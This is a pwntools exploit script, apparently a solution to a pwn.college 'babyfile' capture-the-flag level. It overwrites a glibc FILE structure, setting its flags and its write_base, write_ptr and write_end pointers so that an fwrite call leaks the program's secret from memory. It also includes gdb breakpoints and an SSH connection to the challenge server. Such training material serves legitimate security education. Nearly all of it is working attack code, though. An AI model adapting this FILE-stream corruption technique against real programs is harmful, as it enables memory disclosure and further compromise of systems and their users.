from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level11")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b fwrite  if ( $rdi != stdout )
b _IO_new_fclose if ( $rdi != stdout )
b _IO_new_file_overflow if ( $rdi != stdout )
b new_do_write if ( $rdi != stdout )
b _IO_file_xsgetn if ( $rdi != stdin)
b execve
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level11")
p.sendlineafter(b"[*] Commands: ",b"new_note")
p.sendlineafter(b"How many bytes to the note?\n>",b"200")
p.sendlineafter(b"[*] Commands: ",b"open_file")
p.sendlineafter(b"[*] Commands: ",b"write_fp")
p.sendafter(b" {0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0}\n",
            p64(_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING)+ #_flags
            p64(0)+p64(0)+p64(0)+ # read_ptr,read_end,read_base
            p64(e.sym.secret)+p64(e.sym.secret+70)+p64(e.sym.secret+71)+ # write_base,write_ptr,write_end
            p64(0)+p64(0)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(112-8-8*3*3)+p32(1)+p32(0)+ # fileno, flags2
            b"\0"*(136-112-8)+p64(e.sym.fp+8)+ # _lock
            b"\0"*(160-136-8)+p64(0)+ # _wide_data
            b"\0"*(216-160-8)
            )
p.sendlineafter(b"[*] Commands: ",b"write_file")
p.recvuntil(b'fwrite(notes[0], 1, 200, fp);\n')
p.interactive()